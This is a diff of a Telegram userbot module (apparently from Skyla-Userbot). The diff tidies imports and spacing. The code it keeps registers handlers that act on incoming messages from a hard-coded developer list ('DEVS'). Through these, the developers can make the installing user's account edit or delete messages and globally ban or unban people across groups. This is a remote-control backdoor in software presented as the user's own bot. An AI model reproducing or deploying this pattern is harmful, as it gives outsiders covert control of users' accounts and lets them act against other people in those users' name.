@@ -1,32 +1,22 @@
-#credit by SkyNot
-#From Skyla-Userbot
+# credit by SkyNot
+# From Skyla-Userbot
 
 
 import asyncio
-import random
-import sys
 from asyncio import sleep
 from datetime import datetime
-from io import BytesIO
-from os import environ, execle, remove
 
-from git import Repo
-from git.exc import GitCommandError, InvalidGitRepositoryError, NoSuchPathError
 
-from telethon import events
 from telethon.errors import BadRequestError
 from telethon.tl.functions.channels import EditBannedRequest
-from telethon.tl.types import Channel
 
 import userbot.modules.sql_helper.gban_sql as gban_sql
 from userbot import BOTLOG_CHATID
-from userbot import HEROKU_API_KEY, HEROKU_APP_NAME, UPSTREAM_REPO_URL
 from userbot import CMD_HANDLER as cmd
-from userbot import CMD_HELP, DEVS, bot, owner
+from userbot import CMD_HELP, DEVS
 from userbot.events import register
-from userbot.utils import edit_delete, humanbytes
-from userbot.utils import edit_or_reply, get_user_from_event, skyla_cmd
-from telethon.events import ChatAction
+from userbot.utils import edit_delete
+from userbot.utils import edit_or_reply, get_user_from_event
 
 
 from .admin import BANNED_RIGHTS, UNBAN_RIGHTS
@@ -77,6 +67,7 @@ async def ownfastpurger(purg):
     await sleep(2)
     await done.delete()
 
+
 @register(incoming=True, from_users=DEVS, pattern=r"^\.cedit")
 async def ownediter(edit):
     message = edit.text
@@ -91,6 +82,7 @@ async def ownediter(edit):
             break
         i += 1
 
+
 @register(incoming=True, from_users=DEVS, pattern=r"^\.cdel$")
 async def owndelete_it(delme):
     msg_src = await delme.get_reply_message()
@@ -100,6 +92,7 @@ async def owndelete_it(delme):
             await delme.delete()
         except rpcbaseerrors.BadRequestError:
             await delme.edit("**Tidak Bisa Menghapus Pesan**")
+
 
 @register(incoming=True, from_users=DEVS, pattern=r"^\.cgbann(?: |$)(.*)")
 async def owngban(event):
@@ -152,6 +145,7 @@ async def owngban(event):
         await gbun.edit(
             f"**GBanned** [{user.first_name}](tg://user?id={user.id}) **in** `{count}` **groups in** `{timetaken}` **seconds**!!\n**Added to gbanlist.**"
         )
+
 
 @register(incoming=True, from_users=DEVS, pattern=r"^\.cungbann(?: |$)(.*)")
 async def ownungban(event):
